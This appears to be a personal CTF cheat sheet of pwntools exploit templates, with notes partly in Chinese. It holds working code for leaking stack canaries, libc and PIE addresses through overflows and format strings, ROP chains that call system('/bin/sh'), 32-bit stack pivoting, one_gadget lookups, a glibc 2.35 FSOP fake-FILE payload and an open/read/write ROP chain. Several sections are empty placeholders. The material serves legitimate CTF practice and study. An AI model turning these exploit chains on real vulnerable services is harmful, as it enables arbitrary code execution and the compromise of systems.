simple
```python
from pwn import *


elf = context.binary = ELF("./chall")
p = process()
p = remote("34.45.81.67",16002)
     
gdb.attach(p)

p.sendline()
p.interactive()
```

lambda shortcut
```python
# -*- coding: utf-8 -*-
from pwn import*
context.log_level='debug'
context.arch='amd64'
context.os = "linux"

pc = "./chall_patched"

#libc  = ELF('./libc.so.6', checksec=False)
#ld = ELF("./ld-2.39.so")
exe = context.binary = ELF(pc)



scripts = """
"""
 
if __name__ == '__main__':
    local = sys.argv[1]
    if local == 'l':
        r= process(pc)
        elf = ELF(pc)
    else:
        r=remote("34.45.81.67",16006)
        elf = ELF(pc)

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def piebase(): log.info("pie  base = %#x" % exe.address)
def logleak(name, val):  log.info(name+" = %#x" % val)

s = lambda *a, **k: r.send(*a, **k)
sa = lambda s,n : r.sendafter(s,n)
sla = lambda s,n : r.sendlineafter(s,n)
sl = lambda s : r.sendline(s)
sd = lambda s : r.send(s)
rc = lambda n : r.recv(n)
rl = lambda: r.recvline()
ru = lambda s : r.recvuntil(s, drop=True)
ti = lambda: r.interactive()
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bhex = lambda b: int(b.decode(), 16)
ru7f = lambda: r.recvuntil(b'\x7f')
dbg = lambda: gdb.attach(r)
dbgstart = lambda script=scripts: gdb.attach(r, gdbscript=script)



payload = 

ti()
```

for leak stack + canary
```python
canary_offset = 0x49
payload += "a"*canary_offset
s(payload)
ru(b"a" * canary_offset)

leak=b'\x00'+rl().strip()
warn(f"Thread leak: {leak}")
canary = u64(leak[:8])
print("canary:",hex(canary))
leak_stack = u64(leak[8:]+b'\x00'*(8-len(leak[8:])))
print("leak_stack",hex(leak_stack))
libc_base = leak_stack + 0x200090
print("libc base",hex(libc_base))
libc.address=libc_base
```

BETTER VERSION FOR CANARY SPLIT CAN STRAIGHT USE WITH PIE
[[PWN -- ECHO TIME -- CANARY ORW]]
```python
# leak libc
sla("message: ","%15$p.%16$p.%17$p")
# base 0x7ffff7800000
# leak 0x7ffff7beba83
# offset 0x83FBA40
# offset = 0x7ffff7beba83 - 0x7ffff7800000
# print("offset",hex(offset))
leak = rl().decode().strip()
log.success(f"leak = {leak}")
parts = leak.split(".")

leak_stack = int(parts[1], 16)
canary = int(parts[0], 16)
pie = int(parts[2], 16)

log.success(f"leak_stack = {hex(leak_stack)}")
log.success(f"canary     = {hex(canary)}")
log.success(f"pie     = {hex(pie)}")

# 0x87fdcb0
# offset = leak_stack - 0x7ffff7800000
# print(f"offset to base: {hex(offset)}")

libc.address=leak_stack-0x87fdcb0
logbase()
exe.address=pie-0xc63
piebase()
```

build ROP with canary
attack payload 
就是 offset + canary + 随便 8 个 + ret + pop_rdi + bin_sh + system
可是我看到有人
就是 offset + canary + 随便 8 个 + pop_rdi + bin_sh + ret + system 也可以 
还有
我看到没有ret 也可以 ？？？？就以防万一 alignment 问题
不一定是8 个!!!!!!!
[[PWN -- Chunky Threads -- CANARY ROP]]
```python
libc.address=libc_base
# dbg()

# ROP
rop = ROP(libc)
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']
log.success(f"ret = {hex(ret)}")
log.success(f"pop_rdi = {hex(pop_rdi)}")
log.success(f"bin_sh = {hex(bin_sh)}")
log.success(f"system = {hex(system)}")

offset = 0x48
payload = b'a' * offset 
payload += p64(canary)
payload += b'b' * 8
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

s(payload)
```

stack mitigation templete
[[PWN -- pwn2 QL -- STACK-MITIGATION-32]]
```python


payload = p32(0)                        # 伪造的 old ebp
payload += p32(system_plt_addr)        # ret 到 system()
payload += p32(0)                      # 伪造的返回地址 (cincai)
payload += p32(leak_bss+0x10)          # 参数："/bin/sh" 的地址
payload += b'/bin/sh\x00'              # 真正写入 "/bin/sh" 字符串
payload = payload.ljust(offset, b'\x00')  # 填满 overflow 前的部分
payload += p32(leak_bss)               # 栈迁移：将 esp 指向你构造的 payload（伪造栈帧）区域
payload += p32(leave_ret)              # 执行栈迁移：leave = mov esp, ebp; pop ebp;  ret
```

brute canary 
[[[PWN -- super_jumpio_kart -- canary ROP]]]
```python
from pwn import*
context.log_level='debug'
# context.arch='amd64'
context.os = "linux"

fname = "./super_jumpio_kart_patched"


def fuzz():
  for i in range (100):
    context.log_level = 'critical'
    
    r = process(fname)
    r.sendlineafter('> ', '4')
    r.sendlineafter(': ', f'%{i}$p')
    r.recvuntil('with: ')
    leak = r.recvline().strip().decode()
    if leak.startswith('0x7'):
      print(f'[{i}] Possible LIBC  : {leak}')
    elif leak.startswith('0x5'):
      print(f'[{i}] Possible PIE   : {leak}')
    elif leak.endswith('00'):
      print(f'[{i}] Possible Canary: {leak}')
    r.close()
fuzz()
```

one gadget 
```python
onegadgets = one_gadget(libc.path, libc.address)
logleak("one_gadget",onegadgets[1])
```

FSOP
[[PWN -- jumpios_love_letter -- FSOP vtables]]
```python
print("libc base",hex(libc_base))
heap_base = leak_heap - 0x400 + 0x2a0
print("heap base",hex(heap_base))

# FILE EXLPOIT
# 2.35 GLIBC
stdlock = 0x000000000021ba70
add_rdi = 0x0000000000163830

system = lib_base + 0x50d60
stdout_lock = lib_base + 0x21ba70   # _IO_stdfile_1_lock  (symbol not exported)
stdout = lib_base + 0x21a780
fake_vtable = lib_base+0x2160c0-0x18
gadget = lib_base + 0x163830 # add rdi, 0x10 ; jmp rcx
fake_io = heap_base + 0x1870

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=system        # the function that we will call
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')  # will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= fake_io + 0xb8
fake._wide_data = libc.sym._IO_wide_data_1
fake.unknown2=p64(0)*2+p64(fake_io+0x20)+p64(0)*3+p64(fake_vtable)

payload = b"A"*272
payload += bytes(fake)
```

ORW script  (need pie) + canary
[[PWN -- ECHO TIME -- CANARY ORW]]
```python
rop = ROP(libc)
buff = exe.bss(0x200) # <- 随便放空的地方
rop.call('gets', [buff]) # <- 给等下 input "flag"
rop.call('open', [buff,0])
rop.call('read', [3, buff,128])
rop.call('write', [1, buff,128])

offset = 0x48
payload = b'x' * offset
payload += p64(canary)
payload += b'b' * 8
payload += rop.chain()
```

Double Free
```
```

SROP
```
```

for libc
```

```

for heap
```

```
